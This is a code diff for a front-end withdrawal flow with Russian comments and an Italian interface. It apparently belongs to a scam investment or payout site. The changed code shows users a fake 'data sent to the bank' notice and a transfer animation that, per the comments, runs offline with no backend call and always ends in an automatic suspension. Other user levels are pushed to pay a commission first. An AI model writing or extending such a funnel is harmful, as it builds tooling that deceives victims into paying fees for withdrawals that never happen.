@@ -310,9 +310,15 @@ function openContractSign(): void {
 }
 
 /**
- * Старт воронки после «Avvia» в выпадающей панели.
- * L2 / L4: сразу phase=animating + сцена на Home (без API, без ожидания бэка).
- * L1 / L3: pay_fee → drawer.
+ * После «Avvia il trasferimento» в выпадающей панели:
+ *
+ *  L2: Home → модалка «Dati inviati alla banca» → Continua → анимация
+ *      → по таймеру анимации автоматически suspended (отказ/заморозка).
+ *  L4: Home → сразу анимация (без bank-notice)
+ *      → по таймеру анимации автоматически tg_final.
+ *  L1 / L3: pay_fee → drawer комиссии.
+ *
+ * Бэкенд для L2/L4 анимации не зовём (offline).
  */
 function startWithdrawFunnel(): void {
   selectTab('home')
@@ -320,10 +326,16 @@ function startWithdrawFunnel(): void {
 
   const lv = normalizeLevel()
 
-  /* L2 / L4 — сразу сцена анимации на Home (без API, без bank-notice) */
-  if (lv === 2 || lv === 4) {
-    beginWithdraw()
+  if (lv === 2) {
+    /* Только модалка банка — анимация стартует в onBankNoticeContinue */
+    bankNoticeOpen.value = true
+    return
+  }
+
+  if (lv === 4) {
+    /* Без модалки — сразу анимация отказа */
     bankNoticeOpen.value = false
+    beginWithdraw()
     return
   }
 
@@ -429,7 +441,7 @@ function continueAfterPayout(euros: number): void {
     return
   }
 
-  // L2 / L4: сразу анимация (offline), без запросов к API
+  // L2 → bank-notice → анимация → авто-отказ; L4 → анимация → авто-отказ
   startWithdrawFunnel()
 }
 
@@ -451,12 +463,15 @@ function onAmountConfirm(): void {
   startWithdrawFunnel()
 }
 
+/**
+ * L2: «Continua» на «Dati inviati alla banca» → старт анимации вывода (offline).
+ * После конца таймера useCommission → completeAnimation → suspended автоматически.
+ */
 function onBankNoticeContinue(): void {
   bankNoticeOpen.value = false
-  /* Анимация уже должна идти (startWithdrawFunnel); страховка если begin сбойнул */
-  if (!isAnimating.value && (isReady.value || phase.value === 'ready')) {
-    beginWithdraw()
-  }
+  selectTab('home')
+  if (isAnimating.value) return
+  beginWithdraw()
 }
 
 function onCommissionConfirmed(): void {
